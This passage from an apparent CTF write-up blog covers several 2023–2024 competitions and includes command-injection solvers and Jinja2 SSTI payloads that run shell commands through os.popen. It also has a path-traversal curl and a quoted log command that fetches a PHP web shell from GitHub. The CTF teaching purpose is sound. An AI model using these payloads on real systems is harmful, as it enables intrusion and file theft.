\\??\\C:\\Windows\\system32\\conhost.exe 1644 notepad.exe \u0026#34;C:\\Windows\\system32\\NOTEPAD.EXE\u0026#34; C:\\Users\\joe\\Desktop\\schedule.txt 1804 cGFzdGViaW4uY2 \u0026#34;C:\\temp\\cGFzdGViaW4uY29tL3lBYTFhS2l1.exe\u0026#34; 896 multireader.ex \u0026#34;C:\\temp\\multireader.exe\u0026#34; 1272 iexplore.exe \u0026#34;C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\u0026#34; 1284 iexplore.exe \u0026#34;C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\u0026#34; SCODEF:1272 CREDAT:71937 1536 spoolsv.exe C:\\Windows\\System32\\spoolsv.exe 1848 WmiPrvSE.exe C:\\Windows\\system32\\wbem\\wmiprvse.exe 2052 WmiPrvSE.exe C:\\Windows\\system32\\wbem\\wmiprvse.exe 2168 TrustedInstall C:\\Windows\\servicing\\TrustedInstaller.exe 2568 taskmgr.exe \u0026#34;C:\\Windows\\system32\\taskmgr.exe\u0026#34; /1\rLook athe process running cGFzdGViaW4uY29tL3lBYTFhS2l1.exe, decode it cGFzdGViaW4uY29tL3lBYTFhS2l1\n$ echo \u0026#34;cGFzdGViaW4uY29tL3lBYTFhS2l1\u0026#34; | base64 -d pastebin.com/yAa1aKiu\rThat\u0026rsquo;s a pastebin link https://pastebin.com/yAa1aKiu, and there\u0026rsquo;s a flag on it\nFLAG\rwctf{v0lAt1l3_m3m0ry_4qu1r3D_a3fe9fn3al}\nMisc Made Sense Overview\rAuthor: doubledelete Description: i couldn\u0026rsquo;t log in to my server so my friend kindly spun up a server to let me test makefiles. at least, they thought i couldn\u0026rsquo;t log in :P https://madesense-okntin33tq-ul.a.run.app/\nThis challenge is Misc PyJail/MakeJail called Made Sense that written using the Flask.\nsource.py\r1import os 2from pathlib import Path 3import re 4import subprocess 5import tempfile 6 7from flask import Flask, request, send_file 8 9app = Flask(__name__) 10flag = open(\u0026#39;flag.txt\u0026#39;).read() 11 12def write_flag(path): 13 with open(path / \u0026#39;flag.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: 14 f.write(flag) 15 16def generate_makefile(name, content, path): 17 with open(path / \u0026#39;Makefile\u0026#39;, \u0026#39;w\u0026#39;) as f: 18 f.write(f\u0026#34;\u0026#34;\u0026#34; 19SHELL := /bin/bash 20.PHONY: {name} 21{name}: flag.txt 22\\t{content} 23\u0026#34;\u0026#34;\u0026#34;) 24 25@app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 26def index(): 27 return send_file(\u0026#39;index.html\u0026#39;) 28 29@app.route(\u0026#39;/src/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 30def src(): 31 return send_file(__file__) 32 33# made sense 34@app.route(\u0026#39;/make\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 35def make(): 36 target_name = request.form.get(\u0026#39;name\u0026#39;) 37 code = request.form.get(\u0026#39;code\u0026#39;) 38 39 print(code) 40 if not re.fullmatch(r\u0026#39;[A-Za-z0-9]+\u0026#39;, target_name): 41 return \u0026#39;no\u0026#39; 42 if \u0026#39;\\n\u0026#39; in code: 43 return \u0026#39;no\u0026#39; 44 if re.search(r\u0026#39;flag\u0026#39;, code): 45 return \u0026#39;no\u0026#39; 46 47 with tempfile.TemporaryDirectory() as dir: 48 run_dir = Path(dir) 49 write_flag(run_dir) 50 generate_makefile(target_name, code, run_dir) 51 sp = subprocess.run([\u0026#39;make\u0026#39;], capture_output=True, cwd=run_dir) 52 return f\u0026#34;\u0026#34;\u0026#34; 53\u0026lt;h1\u0026gt;stdout:\u0026lt;/h1\u0026gt; 54{sp.stdout} 55\u0026lt;h1\u0026gt;stderr:\u0026lt;/h1\u0026gt; 56{sp.stderr} 57 \u0026#34;\u0026#34;\u0026#34; 58 59app.run(\u0026#39;localhost\u0026#39;, 8000)\rIf we take look at the source-code it\u0026rsquo;s allows to create a Makefile with a target and a command, and then runs make in a temporary directory containing a flag file. And then checks for the presence of newline characters and the string flag in the command to prevent from reading the flag file directly. However, it doesn\u0026rsquo;t prevent from using other commands or environment variables.\nOne possible solution is to use the cat command with a wildcard (*) instead of the filename. This will read all files in the directory, including the flag file.\nFinal solver automation:\nsolver.py\r1import requests 2import re 3 4data = { 5 \u0026#39;name\u0026#39;: \u0026#39;target\u0026#39;, 6 \u0026#39;code\u0026#39;: \u0026#39;cat *\u0026#39; 7} 8 9response = requests.post(\u0026#39;https://madesense-okntin33tq-ul.a.run.app/make\u0026#39;, data=data) 10flag = re.findall(r\u0026#39;wctf{.*}\u0026#39;, response.text) 11 12print(flag)\rFLAG\rwctf{m4k1ng_vuln3r4b1l1t135}\nMade Functional Overview\rAuthor: doubledelete Description: the second makejail https://madefunctional-okntin33tq-ul.a.run.app/\nAnd the last but not least is same Misc PyJail/MakeJail challenge Made Functional, written using the Flask.\nsource.py\r1import os 2from pathlib import Path 3import re 4import subprocess 5import tempfile 6 7from flask import Flask, request, send_file 8 9app = Flask(__name__) 10flag = open(\u0026#39;flag.txt\u0026#39;).read() 11 12def write_flag(path): 13 with open(path / \u0026#39;flag.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: 14 f.write(flag) 15 16def generate_makefile(name, content, path): 17 with open(path / \u0026#39;Makefile\u0026#39;, \u0026#39;w\u0026#39;) as f: 18 f.write(f\u0026#34;\u0026#34;\u0026#34; 19SHELL := env PATH= /bin/bash 20.PHONY: {name} 21{name}: flag.txt 22\\t{content} 23\u0026#34;\u0026#34;\u0026#34;) 24 25@app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 26def index(): 27 return send_file(\u0026#39;index.html\u0026#39;) 28 29@app.route(\u0026#39;/src/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 30def src(): 31 return send_file(__file__) 32 33# made functional 34@app.route(\u0026#39;/make\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 35def make(): 36 target_name = request.form.get(\u0026#39;name\u0026#39;) 37 code = request.form.get(\u0026#39;code\u0026#39;) 38 39 print(code) 40 if not re.fullmatch(r\u0026#39;[A-Za-z0-9]+\u0026#39;, target_name): 41 return \u0026#39;no\u0026#39; 42 if \u0026#39;\\n\u0026#39; in code: 43 return \u0026#39;no\u0026#39; 44 if re.search(r\u0026#39;/\u0026#39;, code): 45 return \u0026#39;no\u0026#39; 46 47 with tempfile.TemporaryDirectory() as dir: 48 run_dir = Path(dir) 49 write_flag(run_dir) 50 generate_makefile(target_name, code, run_dir) 51 sp = subprocess.run([\u0026#39;make\u0026#39;], capture_output=True, cwd=run_dir) 52 return f\u0026#34;\u0026#34;\u0026#34; 53\u0026lt;h1\u0026gt;stdout:\u0026lt;/h1\u0026gt; 54{sp.stdout} 55\u0026lt;h1\u0026gt;stderr:\u0026lt;/h1\u0026gt; 56{sp.stderr} 57 \u0026#34;\u0026#34;\u0026#34; 58 59app.run(\u0026#39;localhost\u0026#39;, 8000)\rFrom the source it allows to create a Makefile with a target that executes some code when the target is built and it\u0026rsquo;s a same vuln. The SHELL variable in the Makefile is set to env PATH= /bin/bash, which means that the PATH environment variable is set to an empty string when the shell command is executed. This means that the shell will not be able to find any executables in the PATH, so it will only execute commands that are defined in the Makefile itself.\nfirst I simply using:\nname = \u0026#34;readflag\u0026#34;\rcode = \u0026#34;\u0026lt; flag.txt\u0026#34;\rIt seems like the command \u0026lt; flag.txt was executed, but it didn\u0026rsquo;t produce any output. This is because the \u0026lt; operator is used for input redirection, and it needs a command to provide input to.\nUnfortunately, we\u0026rsquo;re limited by the fact that we can\u0026rsquo;t use slashes, and most commands are located in directories that require a slash to access (like /bin or /usr/bin).\nHowever, we can take advantage of the fact that Makefiles allow for multiple lines in the command section if they are separated by semicolons. We can use this feature to first assign the content of the flag file to a variable, and then echo that variable:\nname = \u0026#34;readflag\u0026#34;\rcode = \u0026#34;read -r FLAG \u0026lt; flag.txt; echo $$FLAG\u0026#34;\rFinal solver automation:\nsolver.py\r1import requests 2import re 3 4data = { 5 \u0026#39;name\u0026#39;: \u0026#39;readflag\u0026#39;, 6 \u0026#39;code\u0026#39;: \u0026#39;read -r FLAG \u0026lt; flag.txt; echo $$FLAG\u0026#39; 7} 8 9response = requests.post(\u0026#39;https://madefunctional-okntin33tq-ul.a.run.app/make\u0026#39;, data=data) 10flag = re.findall(r\u0026#39;wctf{.*}\u0026#39;, response.text) 11 12print(flag)\rFLAG\rwctf{m4k1ng_f1l3s}\n","date":"2024-03-16","id":18,"permalink":"/posts/ctfs/2024/wolv-ctf-2024/","summary":"https://ctftime.org/event/2240\nCHALL\u0026rsquo;S SOLVED Category Challenge Beginner Crypto: yORs Truly \u0026lt;3 Beginner Crypto: TwoTimePad Beginner Forensics: Hidden Data Beginner Pwn: babypwn Beginner Pwn: babypwn2 Beginner Rev: babyre Crypto Limited 1 Forensics Eternally Pwned: Infiltration Forensics Eternally Pwned: Persistence Misc Made Sense Misc Made Functional Beginner Crypto: yORs Truly \u0026lt;3 Overview\rAuthor: shlswnt Description: I have encrypted some text but it seems I have lost the key!","tags":[],"title":"Wolv CTF 2024"},{"content":"This is the second time I have participated in the LA CTF 2024 event\nhttps://ctftime.org/event/2102\nCHALL\u0026rsquo;S SOLVED Category Challenge CRYPTOGRAPHY very-hot REVERSE ENGINEERING shattered-memories REVERSE ENGINEERING aplet321 very-hot Description\rAuthor: Red Guy I didn\u0026rsquo;t think that using two primes for my RSA was sexy enough, so I used three.\nsrc.py out.txt\nProvided chall source src.py src.py\r1from Crypto.Util.number import getPrime, isPrime, bytes_to_long 2from flag import FLAG 3 4FLAG = bytes_to_long(FLAG.encode()) 5 6p = getPrime(384) 7while(not isPrime(p + 6) or not isPrime(p + 12)): 8 p = getPrime(384) 9q = p + 6 10r = p + 12 11 12n = p * q * r 13e = 2**16 + 1 14ct = pow(FLAG, e, n) 15 16print(f\u0026#39;n: {n}\u0026#39;) 17print(f\u0026#39;e: {e}\u0026#39;) 18print(f\u0026#39;ct: {ct}\u0026#39;)\rAnd out.txt out.txt\rn: 10565111742779621369865244442986012561396692673454910362609046015925986143478477636135123823568238799221073736640238782018226118947815621060733362956285282617024125831451239252829020159808921127494956720795643829784184023834660903398677823590748068165468077222708643934113813031996923649853965683973247210221430589980477793099978524923475037870799 e: 65537 ct: 9953835612864168958493881125012168733523409382351354854632430461608351532481509658102591265243759698363517384998445400450605072899351246319609602750009384658165461577933077010367041079697256427873608015844538854795998933587082438951814536702595878846142644494615211280580559681850168231137824062612646010487818329823551577905707110039178482377985\rThe provided Python script is implementing a basic RSA encryption scheme with a twist. It generates a prime number p and ensures that p+6 and p+12 are also prime, assigning these to q and r respectively. The product of p, q, and r forms the RSA modulus n. The public exponent e is set to 2^16 + 1, a common choice in RSA systems. The script then converts a secret flag into a long integer and encrypts it using RSA, resulting in the ciphertext ct. The output file contains the values of n, e, and ct, which are part of the public key and the encrypted message in the RSA encryption scheme.\nFinal solver.py solver.py\r1from sympy import nextprime, root 2from Crypto.Util.number import long_to_bytes 3 4def factorize(n): 5 p = nextprime(int(root(n, 3))) 6 while n % p != 0: 7 p = nextprime(p) 8 n //= p 9 q = nextprime(p) 10 while n % q != 0: 11 q = nextprime(q) 12 r = n // q 13 return p, q, r 14 15def decrypt(ct, p, q, r, e): 16 phi = (p - 1) * (q - 1) * (r - 1) 17 d = pow(e, -1, phi) 18 return pow(ct, d, n) 19 20n = 10565111742779621369865244442986012561396692673454910362609046015925986143478477636135123823568238799221073736640238782018226118947815621060733362956285282617024125831451239252829020159808921127494956720795643829784184023834660903398677823590748068165468077222708643934113813031996923649853965683973247210221430589980477793099978524923475037870799 21e = 65537 22ct = 9953835612864168958493881125012168733523409382351354854632430461608351532481509658102591265243759698363517384998445400450605072899351246319609602750009384658165461577933077010367041079697256427873608015844538854795998933587082438951814536702595878846142644494615211280580559681850168231137824062612646010487818329823551577905707110039178482377985 23 24p, q, r = factorize(n) 25flag = decrypt(ct, p, q, r, e) 26print(long_to_bytes(flag))\rTo decrypt an RSA-encrypted message. It first factorizes the RSA modulus n into its prime factors p, q, and r using a function called factorize. This function exploits the fact that p, q, and r are close together, which allows for efficient factorization. Then uses these factors to compute the RSA private key and decrypt the ciphertext ct using a function called decrypt. The decrypted message is converted back to bytes and printed out, revealing the original message.\nrunning\r$ python3 solver.py b\u0026#39;lactf{th4t_w45_n0t_so_53xY}\u0026#39;\rFLAG\rlactf{th4t_w45_n0t_so_53xY}\nshattered-memories Description\rAuthor: aplet123 I swear I knew what the flag was but I can\u0026rsquo;t seem to remember it anymore\u0026hellip; can you dig it out from my inner psyche?\nshattered-memories Provided executable binary file ./shattered-memories\nAnd here\u0026rsquo;s the decompiled of the main function\ndecompiled main\rundefined8 main(void) { int iVar1; size_t sVar2; undefined8 uVar3; char local_98 [8]; char acStack_90 [8]; char acStack_88 [8]; char acStack_80 [8]; char acStack_78 [108]; int local_c; puts(\u0026#34;What was the flag again?\u0026#34;); fgets(local_98,0x80,stdin); strip_newline(local_98); sVar2 = strlen(local_98); if (sVar2 == 0x28) { local_c = 0; iVar1 = strncmp(acStack_90,\u0026#34;t_what_f\u0026#34;,8); local_c = local_c + (uint)(iVar1 == 0); iVar1 = strncmp(acStack_78,\u0026#34;t_means}\u0026#34;,8); local_c = local_c + (uint)(iVar1 == 0); iVar1 = strncmp(acStack_80,\u0026#34;nd_forge\u0026#34;,8); local_c = local_c + (uint)(iVar1 == 0); iVar1 = strncmp(local_98,\u0026#34;lactf{no\u0026#34;,8); local_c = local_c + (uint)(iVar1 == 0); iVar1 = strncmp(acStack_88,\u0026#34;orgive_a\u0026#34;,8); local_c = local_c + (uint)(iVar1 == 0); switch(local_c) { case 0: puts(\u0026#34;No, that definitely isn\\\u0026#39;t it.\u0026#34;); uVar3 = 1; break; case 1: puts(\u0026#34;I\\\u0026#39;m pretty sure that isn\\\u0026#39;t it.\u0026#34;); uVar3 = 1; break; case 2: puts(\u0026#34;I don\\\u0026#39;t think that\\\u0026#39;s it...\u0026#34;); uVar3 = 1; break; case 3: puts(\u0026#34;I think it\\\u0026#39;s something like that but not quite...\u0026#34;); uVar3 = 1; break; case 4: puts(\u0026#34;There\\\u0026#39;s something so slightly off but I can\\\u0026#39;t quite put my finger on it...\u0026#34;); uVar3 = 1; break; case 5: puts(\u0026#34;Yes! That\\\u0026#39;s it! That\\\u0026#39;s the flag! I remember now!\u0026#34;); uVar3 = 0; break; default: uVar3 = 0; } } else { puts(\u0026#34;No, I definitely remember it being a different length...\u0026#34;); uVar3 = 1; } return uVar3; }\rThe function first prompts the user for input. It then checks if the length of the input is 40 characters (0x28 in hexadecimal). If the length is correct, it compares segments of the input with predefined strings. If the length is not correct will returns 1. The function seems to be checking if the input matches a specific format or pattern. The correct input would likely result in the function returning 0.\nBase on strcmp they start with the strings t_what_f, t_means}, nd_forge, lactf{no, and orgive_a. Put into correct order.\nrunning\r$ ./shattered-memories What was the flag again? lactf{not_what_forgive_and_forget_means} Yes! That\u0026#39;s it! That\u0026#39;s the flag! I remember now!\rFLAG\rlactf{not_what_forgive_and_forget_means}\naplet321 Description\rAuthor: kaiphait Unlike Aplet123, Aplet321 might give you the flag if you beg him enough.\nDockerfile aplet321\nProvided executable binary file ./aplet321\nAnd here\u0026rsquo;s the decompiled of the main function\ndecompiled main\rundefined8 main(void) { int iVar1; size_t sVar2; char *pcVar3; int iVar4; int iVar5; char local_238; char acStack_237 [519]; setbuf(stdout,(char *)0x0); puts(\u0026#34;hi, i\\\u0026#39;m aplet321. how can i help?\u0026#34;); fgets(\u0026amp;local_238,0x200,stdin); sVar2 = strlen(\u0026amp;local_238); if (5 \u0026lt; sVar2) { iVar4 = 0; iVar5 = 0; pcVar3 = \u0026amp;local_238; do { iVar1 = strncmp(pcVar3,\u0026#34;pretty\u0026#34;,6); iVar5 = iVar5 + (uint)(iVar1 == 0); iVar1 = strncmp(pcVar3,\u0026#34;please\u0026#34;,6); iVar4 = iVar4 + (uint)(iVar1 == 0); pcVar3 = pcVar3 + 1; } while (pcVar3 != acStack_237 + ((int)sVar2 - 6)); if (iVar4 != 0) { pcVar3 = strstr(\u0026amp;local_238,\u0026#34;flag\u0026#34;); if (pcVar3 == (char *)0x0) { puts(\u0026#34;sorry, i didn\\\u0026#39;t understand what you mean\u0026#34;); return 0; } if ((iVar5 + iVar4 == 0x36) \u0026amp;\u0026amp; (iVar5 - iVar4 == -0x18)) { puts(\u0026#34;ok here\\\u0026#39;s your flag\u0026#34;); system(\u0026#34;cat flag.txt\u0026#34;); return 0; } puts(\u0026#34;sorry, i\\\u0026#39;m not allowed to do that\u0026#34;); return 0; } } puts(\u0026#34;so rude\u0026#34;); return 0; }\rIt first prints a greeting message, then reads a line of input from the user. If the input length is more than 5 characters, it checks for the occurrence of the words \u0026ldquo;pretty\u0026rdquo; and \u0026ldquo;please\u0026rdquo; in the input. If the word \u0026ldquo;please\u0026rdquo; is found, it further checks for the word \u0026ldquo;flag\u0026rdquo;. If \u0026ldquo;flag\u0026rdquo; is also found and the sum of the occurrences of \u0026ldquo;pretty\u0026rdquo; and \u0026ldquo;please\u0026rdquo; equals 54 (0x36 in hexadecimal) and the difference between the occurrences of \u0026ldquo;pretty\u0026rdquo; and \u0026ldquo;please\u0026rdquo; equals -24 (-0x18 in hexadecimal), it prints a message and executes the command cat flag.txt. If these conditions are not met, it prints a refusal message. If the input length is 5 characters or less, it prints a message indicating that the user is being rude. The function returns 0 before it ends.\nFinal solver.py solver.py\r1from pwn import * 2 3def exploit(io): 4 io.recvuntil(b\u0026#34;how can i help?\u0026#34;) 5 6 payload = b\u0026#34;please\u0026#34; * 39 7 payload += b\u0026#34;pretty\u0026#34; * 15 8 payload += b\u0026#34;flag\u0026#34; 9 io.sendline(payload) 10 11 # output = io.recvall() 12 # print(output) 13 io.interactive() 14 15if __name__ == \u0026#34;__main__\u0026#34;: 16 context.update(log_level=\u0026#39;debug\u0026#39;) 17 try: 18 io = remote(\u0026#39;chall.lac.tf\u0026#39;, 31321) 19 exploit(io) 20 except: 21 io = process(\u0026#39;./aplet321\u0026#39;) 22 exploit(io)\rIn order to exploit. The payload consists of the word \u0026ldquo;please\u0026rdquo; repeated 39 times, \u0026ldquo;pretty\u0026rdquo; repeated 15 times, and \u0026ldquo;flag\u0026rdquo;. The sum of the occurrences of \u0026ldquo;pretty\u0026rdquo; and \u0026ldquo;please\u0026rdquo; equals 54 (0x36 in hexadecimal) and the difference between the occurrences of \u0026ldquo;pretty\u0026rdquo; and \u0026ldquo;please\u0026rdquo; equals -24 (-0x18 in hexadecimal). After sending the payload.\nrunning\r$ python3 solver.py [+] Opening connection to chall.lac.tf on port 31321: Done [DEBUG] Received 0x22 bytes: b\u0026#34;hi, i\u0026#39;m aplet321. how can i help?\\n\u0026#34; [DEBUG] Sent 0x149 bytes: b\u0026#39;pleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleaseprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyflag\\n\u0026#39; [*] Switching to interactive mode [DEBUG] Received 0x14 bytes: b\u0026#34;ok here\u0026#39;s your flag\\n\u0026#34; ok here\u0026#39;s your flag [DEBUG] Received 0x35 bytes: b\u0026#34;lactf{next_year_i\u0026#39;ll_make_aplet456_hqp3c1a7bip5bmnc}\\n\u0026#34; lactf{next_year_i\u0026#39;ll_make_aplet456_hqp3c1a7bip5bmnc} [*] Got EOF while reading in interactive $ [*] Interrupted [*] Closed connection to chall.lac.tf port 31321\rFLAG\rlactf{next_year_i'll_make_aplet456_hqp3c1a7bip5bmnc}\n","date":"2024-02-17","id":19,"permalink":"/posts/ctfs/2024/la-ctf-2024/","summary":"This is the second time I have participated in the LA CTF 2024 event\nhttps://ctftime.org/event/2102\nCHALL\u0026rsquo;S SOLVED Category Challenge CRYPTOGRAPHY very-hot REVERSE ENGINEERING shattered-memories REVERSE ENGINEERING aplet321 very-hot Description\rAuthor: Red Guy I didn\u0026rsquo;t think that using two primes for my RSA was sexy enough, so I used three.","tags":[],"title":"LA CTF 2024"},{"content":"Solved for 8 challenges including: (2 Crypto, 2 Forensics, 1 Misc , 1 Reverse Engineering, 2 Web Exploitation)\nhttp://ctf.ara-its.id/\nRepo File Repository ARA 5.0 QUAL CTF 2024\nWriteup Docs Writeup ARA 5.0 QUAL CTF 2024\n","date":"2024-01-28","id":20,"permalink":"/posts/ctfs/2024/ara-5.0-qual-ctf-2024/","summary":"Solved for 8 challenges including: (2 Crypto, 2 Forensics, 1 Misc , 1 Reverse Engineering, 2 Web Exploitation)\nhttp://ctf.ara-its.id/\nRepo File Repository ARA 5.","tags":[],"title":"ARA 5.0 QUAL CTF 2024"},{"content":"Writeup for this local CTF competition organized by ZeroByte.ID Event Organizer in 2023 is conducted as a solo for all the participant.\nhttps://0bytectf2023-34a6e5d64ade17ef4e51612c50dd72f5.zerobyte.id/\nChalls Category Challenge Digital Forensics Who the Hack? Web Exploitation Guestbook (Beta) Web Exploitation Just Explore Who the Hack? Deskripsi\r\u0026mdash;\u0026mdash;\u0026mdash;- Email \u0026mdash;\u0026mdash;\u0026mdash;-\nSubject: URGENT! Anomali Sistem From: farel@halubank.local To: itsec+dfir@halubank.local \u0026lt;2023-08-12 19:46:26\u0026gt;\nDear Tim IT Security,\nTim monitoring mendapati bahwa sistem aplikasi mengalami down saat jam makan siang tadi, namun hanya beberapa menit saja. Berikut ini saya lampirkan access.log dari server terkait, mohon untuk diperiksa segera, apakah ada anomali yang terjadi atau tidak.\nTerima kasih.\nAttachments\nAuthor: novran\nDiberikan sebuah file zip berisi log Who the Hack? dan setelah di telaah lagi ada chall yang menunjukan penyelesaian untuk challenge ini sebenarnya ada pada file challenge satunya yaitu: Romeo and Dulliete langsung saja di analyze file satunya.\nDi kedua file Dulliet.txt \u0026amp; Romeo.txt tersebut, kami menemukan banyak log access github\nKami coba decode urlnya dan didapat command bash,\nbash\rcurl -s \u0026#34;https://raw.githubusercontent.com/graycatninja/own/main/shl.php\u0026#34; \u0026gt; xhl\rHmm.. kemudian kami coba cek dengan username graycatninja dengan akses ke repo https://github.com/graycatninja/own\nTerdapat 4 commits pada repo\nPada commit ke-2, Create flag 5f760e1 ada flagnya\nFlag\r0byteCTF{W3_Suff3r_M0r3_0ft3n_1n_1m4g1n4t10n_Th4n_1n_R34l1ty}\n*note\rMungkin harusnya flag ini disubmit pada chall Romeo \u0026amp; Dulliet karena ini filenya, tetapi karna entah kenapa dicoba submit tidak bisa, lalu kami coba di Who the Hack? dan ahkhirnya bisa.\nGuestbook (Beta) Deskripsi\rYou know what you do!\nhttp://0x7e7ctf.zerobyte.me:40009/\nAuthor: novran\nDiberikan sebuah challenge web yang diminta untuk menginputkan Nama, yang jika disubmit akan tampil Namanya\nKemudian kami coba cari Tech Stack pada webnya ternyata menggunakan Flask, mengingat Flask ini dapat bisa juga vulnerable dengan SSTI apabila kesalahan dalam scriptingnya.\nLalu kami coba lakukan exploitasi pada inputnya, setelah saya menginputkan basic payload umum pada SSTI {{7*7}} dan ternyata benar bahwa kita bisa melakukan SSTI disini.\nBerikut adalah link repo segala payload yang kami gunakan untuk melakukan bypass filters SSTI jinja2\nid\r{{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;id\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}}\rls /\r{{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;ls /\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}}\rDapat dibuktikan bahwa payload tersebut telah berhasil dieksekusi, oleh karena itu tinggal cari flag dan baca isi file saja.\ncat /app/main.py\r{{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;cat /app/main.py\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}}\rPenyelesaian dengan Solver\nsolver.py\r1import requests 2import re 3 4url = \u0026#34;http://0x7e7ctf.zerobyte.me:40009\u0026#34; 5endpoint = \u0026#34;/?name=\u0026#34; 6payload = \u0026#34;{{request|attr(%27application%27)|attr(%27\\x5f\\x5fglobals\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fbuiltins\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fimport\\x5f\\x5f%27)(%27os%27)|attr(%27popen%27)(%27cat%20/app/main.py%27)|attr(%27read%27)()}}\u0026#34; 7 8response = requests.get(url + endpoint + payload) 9 10flag = re.findall(r\u0026#39;0byteCTF\\{[A-Za-z0-9_]+\\}\u0026#39;, response.text) 11print(flag)\rFlag\r0byteCTF{Th3_M4n_wh0_Th1nks_h3_C4n_4nd_th3_M4n_wh0_Th1nks_h3_C4nt_4r3_B0th_R1ght}\nJust Explore Deskripsi\rJust explore and find a vulnerability innit :)\nhttp://0x7e7ctf.zerobyte.me:49723/\nAuthor: novran\nDiberikan sebuah challenge web yang disuruh menuju ke halaman (endpoint) explorer\nSaya menemukan pada Tech Stack terdapat nginx. Kemudian saya mencoba mengutak-atik pada url-nya, dan ditemukan bahwa web ini vulnerable dengan Directory Traversal / Path Traversal setelah saya coba akses\nhttp://0x7e7ctf.zerobyte.me:49723/explore../\nIni terjadi ketika kesalahan konfigurasi pada nginx (alias) apabila mengakses directory yang di sisipkan ../ pada directory /exprore../\nReference\nTinggal kita cari flagnya saja, ada di http://0x7e7ctf.zerobyte.me:49723/explore../usr/share/\nbash\rcurl http://0x7e7ctf.zerobyte.me:49723/explore../usr/share/flag.txt\rFlag\r0byteCTF{P4th_Tr4v3rS4L_ThRu_Ng1nX_M1sC0nf1g_4l14s}\n","date":"2023-08-21","id":21,"permalink":"/posts/ctfs/2023/0byte-ctf-2023/","summary":"Writeup for this local CTF competition organized by ZeroByte.ID Event Organizer in 2023 is conducted as a solo for all the participant.","tags":[],"title":"0Byte CTF 2023"},{"content":"https://ctftime.org/event/1963\nChalls Category Challenge Digital Forensics The Cryptic Sound Reverse Engineering Start The Dos Cryptography The Beginning Of All Web 3.0 Private\u0026rsquo;s been Captured Web 3.0 Permission Denied The Cryptic Sound Description\rElliot was working late at night when he suddenly heard a strange sound coming from his computer. At first, he thought it was just a glitch or some interference, but the sound kept repeating. Elliot felt a strange sense of unease and began to suspect that there might be a hidden message in the sound.\nFlag Format: CHCTF{}\nGiven a WAV audio file that plays strange audio when played, we assume it contains Morse code.\nWe can decode it using Morse Audio Decoder website\nhttps://databorder.com/transfer/morse-sound-receiver/\nFlag\rCHCTF{BONSOIRELLIOT}\nStart The Dos Description\rLeon wants you to be a part of Agents of Havoc. He wants you to understand this software as old as hacking itself so as to fire a DoS Attack against whiterose\u0026rsquo;s targets. Help him before he suspects your intentions.\nFlag Format: CHCTF{}\nGiven a file named dosser.s we can compile it using the following commands:\nbash\r$ nasm -f elf32 -o dosser.o dosser.s $ ld -m elf_i386 -o dosser dosser.o\rbash\r$ file dosser dosser: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped\rAfter that, we can reverse the dosser ELF file using IDA Disassembler 32 bit. We will find a separate flag in the text segment stored in the al register.\nFlag\rCHCTF{L33T_CR4CK3R_5TR1K3S_4G41N}\nThe Beginning Of All Description\rI was working on my laptop when my laptop suddenly glitched. I discussed it with my friends and to our surprise we all had the same color glitch. I guess it has to do something with the odd behavior of the people around me.\nFlag Format: CHCTF{}\nGiven an MP4 video file that we were able to play, I initially thought that the video was corrupted due to color issues. However, after gathering more information, I discovered that it was actually a Hexahue Alphabet code.\nFlag\rCHCTF{5URR3ND3R_0R_5UFF3R}\nPrivate\u0026rsquo;s been Captured Description\rLeon just had a secret meeting with Alice. Book a SLOT with Alice see what he is upto.\nFlag Format: CHCTF{}\nIn this Web3.0 (Blockchain) category challenge is presented in the form of a link resulting from an Ethereum transaction. This challenge is often encountered in the realm of Web3.0, and by clicking on Transaction Details we can access further information by selecting More Details \u0026gt; Click to Show More \u0026gt; View Input As followed by UTF-8.\nFlag\rCHCTF{1_kn0w_1'm_n0t_4l0n3}\nPermission Denied Description\rCisco believes private data isn\u0026rsquo;t readable. Is it 